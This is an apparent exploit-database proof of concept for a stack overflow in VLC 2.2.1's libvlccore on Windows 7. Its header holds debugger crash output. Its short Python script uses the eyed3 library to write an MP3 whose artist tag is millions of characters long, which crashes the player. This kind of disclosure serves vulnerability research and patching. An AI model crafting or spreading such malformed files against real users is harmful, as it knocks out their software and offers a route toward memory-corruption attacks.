# Exploit Title: VLC | libvlccore - (.mp3) Stack Overflow
# Date: 18/10/2015
# Exploit Author: Andrea Sindoni
# Software Link: https://www.videolan.org/vlc/index.it.html
# Version: 2.2.1
# Tested on: Windows 7 Professional 64 bits
#
# PoC with MP3: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/38485.zip
#

#APP:  vlc.exe
#ANALYSIS_VERSION: 6.3.9600.17336 (debuggers(dbg).150226-1500) amd64fre
#FOLLOWUP_NAME:  MachineOwner
#MODULE_NAME: libvlccore
#IMAGE_NAME:  libvlccore.dll
#FAILURE_ID_HASH_STRING:  um:wrong_symbols_c00000fd_libvlccore.dll!vlm_messageadd
#Exception Hash (Major/Minor): 0x60346a4d.0x4e342e62
#EXCEPTION_RECORD:  ffffffffffffffff -- (.exr 0xffffffffffffffff)
#ExceptionAddress: 00000000749ba933 (libvlccore!vlm_MessageAdd+0x00000000000910d3)
#  ExceptionCode: c00000fd (Stack overflow)
#  ExceptionFlags: 00000000
#NumberParameters: 2
#   Parameter[0]: 0000000000000001
#   Parameter[1]: 0000000025ed2a20
#
#eax=00436f00 ebx=2fdc0100 ecx=25ed2a20 edx=00632efa esi=17fb2fdc edi=00000001
#eip=749ba933 esp=260cfa14 ebp=260cfa78 iopl=0         nv up ei pl nz na po nc
#cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
#
#Stack Overflow starting at libvlccore!vlm_MessageAdd+0x00000000000910d3 (Hash=0x60346a4d.0x4e342e62)
#

import eyed3

value = u'B'*6500000

audiofile = eyed3.load("base.mp3")
audiofile.tag.artist = value
audiofile.tag.album = u'andrea'
audiofile.tag.album_artist = u'sindoni'

audiofile.tag.save()